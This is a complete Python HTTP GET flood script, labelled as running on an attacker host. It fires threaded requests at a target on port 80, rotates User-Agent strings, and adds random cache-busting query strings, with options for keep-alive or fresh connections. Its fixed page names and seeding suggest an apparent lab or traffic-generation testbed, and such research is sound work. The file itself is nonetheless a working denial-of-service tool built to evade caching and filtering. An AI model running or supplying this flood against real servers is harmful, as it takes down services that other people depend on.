#!/usr/bin/env python3
"""HTTP GET flood. Runs inside an attacker host.

--mode keepalive : many requests on the same TCP connection
--mode new       : new TCP connection for every request
--urls fixed     : same page every time
--urls random    : random pages, sometimes with a random query string (cache-busting)
"""
import argparse
import http.client
import random
import threading
import time

UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Mozilla/5.0 (X11; Linux x86_64)",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_0)", "curl/7.81.0", "python-requests/2.31"]

p = argparse.ArgumentParser()
p.add_argument("--target", required=True)
p.add_argument("--threads", type=int, default=20)
p.add_argument("--duration", type=float, default=30)
p.add_argument("--mode", choices=["keepalive", "new"], default="new")
p.add_argument("--urls", choices=["fixed", "random"], default="random")
p.add_argument("--delay", type=float, default=0.0, help="sleep between requests per thread")
p.add_argument("--seed", type=int, default=0)
a = p.parse_args()

stop = time.time() + a.duration


def worker(seed):
    rng = random.Random(seed)
    conn = None
    while time.time() < stop:
        path = "/p000.html"
        if a.urls == "random":
            path = f"/p{rng.randrange(200):03d}.html"
            if rng.random() < 0.3:
                path += f"?q={rng.randrange(10**6)}"
        try:
            if conn is None:
                conn = http.client.HTTPConnection(a.target, 80, timeout=3)
            conn.request("GET", path, headers={"User-Agent": rng.choice(UAS)})
            conn.getresponse().read()
            if a.mode == "new":
                conn.close()
                conn = None
        except Exception:
            try:
                conn.close()
            except Exception:
                pass
            conn = None
            time.sleep(0.05)
        if a.delay:
            time.sleep(a.delay)


ts = [threading.Thread(target=worker, args=(a.seed * 1000 + i,), daemon=True)
      for i in range(a.threads)]
for t in ts:
    t.start()
for t in ts:
    t.join()
